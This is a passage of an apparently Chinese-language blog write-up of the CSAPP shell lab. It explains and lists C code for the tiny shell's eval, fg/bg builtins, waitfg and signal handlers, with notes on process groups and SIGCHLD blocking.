sig)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we've provided for you */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clearjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">addjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid, <span class="type">int</span> state, <span class="type">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deletejob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">fgpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">job_t</span> *<span class="built_in">getjobpid</span>(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">job_t</span> *<span class="built_in">getjobjid</span>(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">int</span> jid); </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pid2jid</span><span class="params">(<span class="type">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">listjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">usage</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unix_error</span><span class="params">(<span class="type">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">app_error</span><span class="params">(<span class="type">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="type">void</span> <span class="title">handler_t</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Some function defined by myself*/</span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">Fork</span><span class="params">()</span></span>;<span class="comment">//即CSAPP上提到的错误处理封装函数,不过用起来并不是很顺手</span></span><br></pre></td></tr></tbody></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>调用parseline函数解析命令行得到argv参数列表,获得前台或后台运行的标志state.<br>调用builtin_cmd检测是否是内置命令,若是则在其中处理,否则返回eval函数fork出子进程,子进程execve方式启动新程序,父进程将job通过addjob加入全局jobs列表,若为前台运行则调用waitfg等待前台程序结束.</p><p>需要注意的问题有两个.<br>第一个:</p><blockquote><p>When you run your shell from the standard Unix shell, your shell is running in the foreground processgroup.  If your shell then creates a child process, by defaultthat child will also be a member of theforeground process group. Since typingctrl-csends a SIGINT to every process in the foregroundgroup, typingctrl-cwill send a SIGINT to your shell, as well as to every process that your shellcreated, which obviously isn’t correct.Here  is  the  workaround:   After  thefork,  but  before  theexecve,  the  child  process  should  callsetpgid(0, 0), which puts the child in a new process group whose group ID is identical to thechild’s PID. This ensures that there will be only one process,  your shell, in the foreground processgroup.   When you typectrl-c, the shell should catch the resulting  SIGINT and then forward itto the appropriate foreground job (or more precisely, the process group that contains the foregroundjob).</p></blockquote><p>因为我们的shell(tsh)是运行在Unix shell之上的,所以当kernel发出一个SIGINT之类的信号,Unix shell会将信号同时发送给tsh以及所有tsh创建的进程(因为tsh是当前shell的前台进程,shell的默认行为会将SIGINT信号发送给整个<code>前台进程组</code>),而我们想要实现的只是将信号发送给tsh的前台进程组.所以在fork子进程后,需要setpgid使得子进程的进程组与父进程独立.</p><blockquote><p>int setpgid(pid_t pid, pid_t pgid);<br>该函数可以用于将一个进程加入到指定的进程组中，或者创建一个新的进程组。具体的行为取决于 pid 参数的取值：<br>    1. 如果 pid 参数为 0，则表示将调用进程加入到与调用进程的PID相同的进程组中。<br>    2. 如果 pgid 参数为 0，则表示将 pid 指定的进程的进程组ID设置为其自身的PID。<br>    3. 如果 pgid 参数不为 0，则表示将 pid 指定的进程的进程组ID设置为 pgid。<br>    setpgid 函数的返回值为 0 表示成功，返回值为 -1 表示出现错误，此时可以通过查看 errno 变量来获取具体的错误信息。</p></blockquote><p>第二个:</p><blockquote><p>In eval, the parent must usesigprocmaskto block SIGCHLD signals before it forks the child,and then unblock these signals, again usingsigprocmaskafter it adds the child to the job list by calling addjob. Since children inherit the blocked vectors of their parents, the child must be sureto then unblock SIGCHLD signals before it execs the new program.6<br>    The parent needs to block theSIGCHLDsignals in this way in order to avoid the race condition wherethe child is reaped by sigchld handler(and thus removed from the job list) before the parent calls addjob.</p></blockquote><p>由于进程间执行顺序是不确定的,子进程在被fork之后在最极端的情况下可以一直执行到结束而父进程还刚从fork函数返回.也就是说,父进程一旦fork子进程,随时可能收到SIGCHLD信号(子进程随时可能暂停或终止).设想一下在父进程fork子进程后,addjob之前,子进程结束发出SIGCHLD信号,父进程捕获信号并在信号处理程序中deletejob删除一个不存在的job,这可能引发错误或被deletejob无视(取决于deletejob的实现),父进程从信号处理函数返回后再调用addjob则会将一个已经终止的进程加入任务列表中.这显然是错误的.所以需要在fork函数之前阻塞SIGCHLD信号,addjob后恢复.需要注意的是子进程会继承父进程的阻塞状态,所以需要在execve之前恢复阻塞.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment">//  * background children don't receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span>* argv[MAXARGS];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> state;</span><br><span class="line">    <span class="type">sigset_t</span> mask,prev;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;mask,SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parseline</span>(cmdline,argv))</span><br><span class="line">        state = BG;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        state = FG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">builtin_cmd</span>(argv))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask,&amp;prev);</span><br><span class="line">        <span class="keyword">if</span>((pid = <span class="built_in">Fork</span>())==<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">           <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">setpgid</span>(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">unix_error</span>(<span class="string">"setpgid error"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">execve</span>(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">unix_error</span>(<span class="string">"%s: command not found"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">addjob</span>(jobs,pid,state,cmdline);</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(state==FG)</span><br><span class="line">            <span class="built_in">waitfg</span>(pid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>,<span class="built_in">pid2jid</span>(pid),pid,cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"quit"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>)||!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"jobs"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">listjobs</span>(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="dofgbg"><a href="#dofgbg" class="headerlink" title="dofgbg"></a>dofgbg</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> jid;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'%'</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((jid = <span class="built_in">atoi</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]))&lt;=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobjid</span>(jobs,jid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, jid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((pid = <span class="built_in">atoi</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]))&lt;=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobpid</span>(jobs,pid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such process\n"</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>))</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-job-&gt;pid,SIGCONT)&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill error"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>))</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-job-&gt;pid,SIGCONT)&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill error"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">        <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"do_bgfg: Internal error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>我使用了和write up上不同的处理,具体见注释.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//根据write up上的描述,waitfg使用 use a busy loop around thesleepfunction.的方式实现</span></span><br><span class="line">    <span class="comment">// while(1)</span></span><br><span class="line">    <span class="comment">// {</span></span><br><span class="line">    <span class="comment">//     if(job-&gt;state==FG)</span></span><br><span class="line">    <span class="comment">//         sleep(1);</span></span><br><span class="line">    <span class="comment">//     else</span></span><br><span class="line">    <span class="comment">//         break;</span></span><br><span class="line">    <span class="comment">// }</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//但CSAPP书上提到这种方法执行太慢,故采用sigsuspend函数</span></span><br><span class="line">    <span class="type">sigset_t</span> mask,prev;</span><br><span class="line">    <span class="comment">//获取当前set存入prev</span></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask,&amp;prev);</span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state==FG)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sigsuspend</span>(&amp;prev);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>注意Linux的显式信号阻塞可能丢弃掉一部分SIGCHLD信号,所以在sigchld_handler函数的一次调用中需要尽可能多的回收子进程.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn't wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> jid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigchld_handler: entering"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>,&amp;status,WNOHANG|WUNTRACED))&gt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobpid</span>(jobs,pid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="string">"Lost track of (%d)\n"</span>,pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">WIFSTOPPED</span>(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>,jid,job-&gt;pid,<span class="built_in">WSTOPSIG</span>(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">WIFEXITED</span>(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">deletejob</span>(jobs,pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) deleted\n"</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n"</span>, jid, pid, <span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">deletejob</span>(jobs,pid))</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>(verbose)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) deleted\n"</span>, jid, pid);</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, jid, pid, <span class="built_in">WTERMSIG</span>(status));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigchld_handler: exiting"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="sigint-handler、sigtstp-handler"><a href="#sigint-handler、sigtstp-handler" class="headerlink" title="sigint_handler、sigtstp_handler"></a>sigint_handler、sigtstp_handler</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigint_handler: entering"</span>);</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid){</span><br><span class="line">        <span class="comment">//pid设置为负,将信号发送给整个进程组.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill (sigint) error"</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose){</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"sigint_handler: Job (%d) killed\n"</span>, pid);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigint_handler: exiting"</span>);</span><br><span class="line"></span><br><span 